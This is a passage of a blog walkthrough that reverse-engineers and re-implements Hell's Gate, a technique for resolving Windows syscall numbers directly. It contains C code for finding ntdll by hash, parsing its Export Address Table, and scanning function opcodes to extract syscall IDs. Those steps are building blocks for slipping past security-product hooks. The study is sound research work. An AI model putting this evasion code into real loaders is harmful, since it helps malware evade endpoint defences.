</span></span><span class="line"><span class="cl">                                                                     <span class="n">dwModuleHash</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                                                                     <span class="p">(</span><span class="n">std</span><span class="o">::</span><span class="kt">int64_t</span><span class="p">)</span><span class="n">pLdrDataTableEntry</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">dwModuleHash</span> <span class="o">==</span> <span class="n">NTDLL_HASH</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">std</span><span class="o">::</span><span class="nf">wprintf</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;[+] Located ntdll: 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pLdrDataTableEntry</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pLdrDataTableEntry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div>

<h2 class="relative group">Getting the Export Address Table (EAT) of NTDLL 
    <div id="getting-the-export-address-table-eat-of-ntdll" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#getting-the-export-address-table-eat-of-ntdll" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>The next step we see is getting the Export Address Table of NTDLL.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">        <span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="n">pImageExportDirectory</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">GetImageExportDirectory</span><span class="p">(</span><span class="n">pLdrDataEntry</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pImageExportDirectory</span><span class="p">)</span> <span class="o">||</span> <span class="n">pImageExportDirectory</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mh">0x01</span><span class="p">;</span>
</span></span></code></pre></div><p>Now looking at the source this function was created by the author of Hells Gate, let&rsquo;s look at that source.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">GetImageExportDirectory</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">pModuleBase</span><span class="p">,</span> <span class="n">PIMAGE_EXPORT_DIRECTORY</span><span class="o">*</span> <span class="n">ppImageExportDirectory</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Get DOS header
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">PIMAGE_DOS_HEADER</span> <span class="n">pImageDosHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">pModuleBase</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">pImageDosHeader</span><span class="o">-&gt;</span><span class="n">e_magic</span> <span class="o">!=</span> <span class="n">IMAGE_DOS_SIGNATURE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Get NT headers
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">PIMAGE_NT_HEADERS</span> <span class="n">pImageNtHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pImageDosHeader</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">pImageNtHeaders</span><span class="o">-&gt;</span><span class="n">Signature</span> <span class="o">!=</span> <span class="n">IMAGE_NT_SIGNATURE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Get the EAT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">*</span><span class="n">ppImageExportDirectory</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pImageNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">VirtualAddress</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Let&rsquo;s take a closer look at this in WinDbg.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/EzekielsWheelScreenshots/eat.png" alt="alt text" />
      
    </figure>
</p>
<p>Once we have the DataDirectory we can obtain the VirtualAddress of the Export Address Table from the first index in the DataDirectory. We can confirm this with <code>!dh ntdll.dll -f</code>.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/EzekielsWheelScreenshots/eat_addr.png" alt="alt text" />
      
    </figure>
</p>
<p>Let&rsquo;s go ahead and quickly re-implement this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">GetExportAddressTable</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">pModuleBase</span><span class="p">,</span> <span class="n">PIMAGE_EXPORT_DIRECTORY</span><span class="o">*</span> <span class="n">ppImageExportDirectory</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PIMAGE_DOS_HEADER</span> <span class="n">pImageDosHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">pModuleBase</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PIMAGE_NT_HEADERS</span> <span class="n">pImageNtHeaders</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* Verify that the DOS header is valid */</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">pImageDosHeader</span><span class="o">-&gt;</span><span class="n">e_magic</span> <span class="o">!=</span> <span class="n">IMAGE_DOS_SIGNATURE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="sa">L</span><span class="s">&#34;[-] Failed to detect DOS header</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* Get a pointer to the IMAGE_NT_HEADER structure of the module (ntdll.dll) */</span>
</span></span><span class="line"><span class="cl">    <span class="n">pImageNtHeaders</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pImageDosHeader</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">pImageNtHeaders</span><span class="o">-&gt;</span><span class="n">Signature</span> <span class="o">!=</span> <span class="n">IMAGE_NT_SIGNATURE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="sa">L</span><span class="s">&#34;[-] Failed to obtain pointer to IMAGE_NT_HEADERS</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="cm">/* Obtain the address of the EAT */</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">ppImageExportDirectory</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pImageNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">VirtualAddress</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div>

<h2 class="relative group">Understanding GetVxTableEntry() 
    <div id="understanding-getvxtableentry" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#understanding-getvxtableentry" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>The next step we see is a declaration of a <code>VX_TABLE</code> structure along with a call to the function <code>GetVxTableEntry()</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">        <span class="n">VX_TABLE</span> <span class="n">Table</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="n">Table</span><span class="p">.</span><span class="n">NtAllocateVirtualMemory</span><span class="p">.</span><span class="n">dwHash</span> <span class="o">=</span> <span class="mh">0xf5bd373480a6b89b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">GetVxTableEntry</span><span class="p">(</span><span class="n">pLdrDataEntry</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">,</span> <span class="n">pImageExportDirectory</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Table</span><span class="p">.</span><span class="n">NtAllocateVirtualMemory</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="mh">0x1</span><span class="p">;</span>
</span></span></code></pre></div><p>Lets start breaking down the <code>GetVxTableEntry()</code> function. These first three lines</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">GetVxTableEntry</span><span class="p">(</span><span class="n">PVOID</span> <span class="n">pModuleBase</span><span class="p">,</span> <span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="n">pImageExportDirectory</span><span class="p">,</span> <span class="n">PVX_TABLE_ENTRY</span> <span class="n">pVxTableEntry</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PDWORD</span> <span class="n">pdwAddressOfFunctions</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDWORD</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pImageExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfFunctions</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">PDWORD</span> <span class="n">pdwAddressOfNames</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDWORD</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pImageExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNames</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">PWORD</span> <span class="n">pwAddressOfNameOrdinales</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWORD</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pImageExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNameOrdinals</span><span class="p">);</span>
</span></span></code></pre></div><p>Sadly, this structure is not open source. Luckily, I was able to find the structure definition on <a href="https://doxygen.reactos.org/de/d20/struct__IMAGE__EXPORT__DIRECTORY.html" target="_blank">ReactOS</a> as well as <a href="http://malwareid.in/unpack/unpacking-basics/export-address-table-and-dll-hijacking" target="_blank">malware.in</a>. Using this we can manually verify this to be true using WinDbg.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_IMAGE_EXPORT_DIRECTORY</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">Characteristics</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">TimeDateStamp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">WORD</span> <span class="n">MajorVersion</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">WORD</span> <span class="n">MinorVersion</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">Name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">Base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">NumberOfFunctions</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">NumberOfNames</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PDWORD</span> <span class="o">*</span><span class="n">AddressOfFunctions</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PDWORD</span> <span class="o">*</span><span class="n">AddressOfNames</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PWORD</span> <span class="o">*</span><span class="n">AddressOfNameOrdinals</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">IMAGE_EXPORT_DIRECTORY</span><span class="p">,</span> <span class="o">*</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span><span class="p">;</span>
</span></span></code></pre></div><p>Using this structure we can start to map how this structure is used by the malware.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/EzekielsWheelScreenshots/image_export_directory_re.png" alt="alt text" />
      
    </figure>
</p>
<p>The next lines of code we see a pretty gnarly for-loop.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="n">WORD</span> <span class="n">cx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">cx</span> <span class="o">&lt;</span> <span class="n">pImageExportDirectory</span><span class="o">-&gt;</span><span class="n">NumberOfNames</span><span class="p">;</span> <span class="n">cx</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">PCHAR</span> <span class="n">pczFunctionName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pdwAddressOfNames</span><span class="p">[</span><span class="n">cx</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">                <span class="n">PVOID</span> <span class="n">pFunctionAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pModuleBase</span> <span class="o">+</span> <span class="n">pdwAddressOfFunctions</span><span class="p">[</span><span class="n">pwAddressOfNameOrdinales</span><span class="p">[</span><span class="n">cx</span><span class="p">]];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nf">djb2</span><span class="p">(</span><span class="n">pczFunctionName</span><span class="p">)</span> <span class="o">==</span> <span class="n">pVxTableEntry</span><span class="o">-&gt;</span><span class="n">dwHash</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="n">pVxTableEntry</span><span class="o">-&gt;</span><span class="n">pAddress</span> <span class="o">=</span> <span class="n">pFunctionAddress</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                        <span class="c1">// Quick and dirty fix in case the function has been hooked
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                        <span class="n">WORD</span> <span class="n">cw</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                <span class="c1">// check if syscall, in this case we are too far
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x0f</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="n">cw</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x05</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                <span class="c1">// check if ret, in this case we are also probaly too far
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xc3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                <span class="c1">// First opcodes should be :
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="c1">//    MOV R10, RCX
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="c1">//    MOV RCX, &lt;syscall&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x4c</span>
</span></span><span class="line"><span class="cl">                                        <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8b</span>
</span></span><span class="line"><span class="cl">                                        <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xd1</span>
</span></span><span class="line"><span class="cl">                                        <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xb8</span>
</span></span><span class="line"><span class="cl">                                        <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x00</span>
</span></span><span class="line"><span class="cl">                                        <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">7</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                        <span class="n">BYTE</span> <span class="n">high</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">5</span> <span class="o">+</span> <span class="n">cw</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                        <span class="n">BYTE</span> <span class="n">low</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">cw</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                        <span class="n">pVxTableEntry</span><span class="o">-&gt;</span><span class="n">wSystemCall</span> <span class="o">=</span> <span class="p">(</span><span class="n">high</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="n">low</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                                        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                                <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                <span class="n">cw</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="p">};</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></div><p>Let&rsquo;s break down the first few lines.</p>
<ul>
<li>First, we see that we are iterating over the number of names in the IMAGE_EXPORT_DIRECTORY (<code>for (WORD cx = 0; cx &lt; pImageExportDirectory-&gt;NumberOfNames; cx++) {</code>)</li>
<li>Then we iterate over each function name just as we saw in WinDbg <code>PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);</code></li>
<li>Next, we get the function addresses as prevously seen <code>PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];</code></li>
</ul>
<p>If we re-implement this in our PoC we see the following:</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/EzekielsWheelScreenshots/getting_pointers.png" alt="alt text" />
      
    </figure>
</p>
<p>The next line is an <code>if</code> condition. Intrestingly, we see the introduction of a new function <code>djb2()</code>.</p>
<ul>
<li><code>if (djb2(pczFunctionName) == pVxTableEntry-&gt;dwHash) {</code></li>
</ul>
<p>In addition, we once more see our previously set dwHash. Now from my perspective this does not appear to be necessary. We could use any other hashing function&hellip; but for now I&rsquo;ll leave this function as designed.</p>
<p>The next block of code is rather &ldquo;large&rdquo;, we see a few checks then we see we ultimately look for opcodes <code>0x4c, 0x8bx 0xd1, 0xb8, 0x00, and 0x00</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">                        <span class="n">pVxTableEntry</span><span class="o">-&gt;</span><span class="n">pAddress</span> <span class="o">=</span> <span class="n">pFunctionAddress</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                        <span class="c1">// Quick and dirty fix in case the function has been hooked
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                        <span class="n">WORD</span> <span class="n">cw</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="k">while</span> <span class="p">(</span><span class="n">TRUE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                <span class="c1">// check if syscall, in this case we are too far
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x0f</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="n">cw</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x05</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                <span class="c1">// check if ret, in this case we are also probaly too far
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xc3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                <span class="c1">// First opcodes should be :
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="c1">//    MOV R10, RCX
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="c1">//    MOV RCX, &lt;syscall&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                                <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x4c</span>
</span></span><span class="line"><span class="cl">                                        <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x8b</span>
</span></span><span class="line"><span class="cl">                                        <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xd1</span>
</span></span><span class="line"><span class="cl">                                        <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xb8</span>
</span></span><span class="line"><span class="cl">                                        <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x00</span>
</span></span><span class="line"><span class="cl">                                        <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">7</span> <span class="o">+</span> <span class="n">cw</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                        <span class="n">BYTE</span> <span class="n">high</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">pFunctionAddress</span> <span class="o">+</span> <span class="mi">5</span> <span class="o">+</span> <span class="n">cw</span><span class="p">);</span>
